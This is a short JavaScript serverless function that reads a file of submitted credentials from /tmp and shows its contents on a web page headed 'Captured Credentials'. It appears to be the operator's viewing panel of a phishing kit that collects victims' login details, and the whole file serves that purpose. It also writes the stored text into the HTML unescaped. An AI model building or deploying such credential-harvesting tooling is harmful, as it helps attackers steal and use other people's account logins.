const fs = require('fs');
const path = require('path');

exports.handler = async (event) => {
    const filePath = path.join('/tmp', 'credentials.txt');

    // Check if the file exists
    if (!fs.existsSync(filePath)) {
        return {
            statusCode: 200,
            body: '<h2>No credentials found.</h2><p>No one has submitted credentials yet.</p>',
            headers: {
                'Content-Type': 'text/html',
            },
        };
    }

    // Read and display the contents of the file
    const credentials = fs.readFileSync(filePath, 'utf-8');
    return {
        statusCode: 200,
        body: `<h2>Captured Credentials</h2><pre>${credentials}</pre>`,
        headers: {
            'Content-Type': 'text/html',
        },
    };
};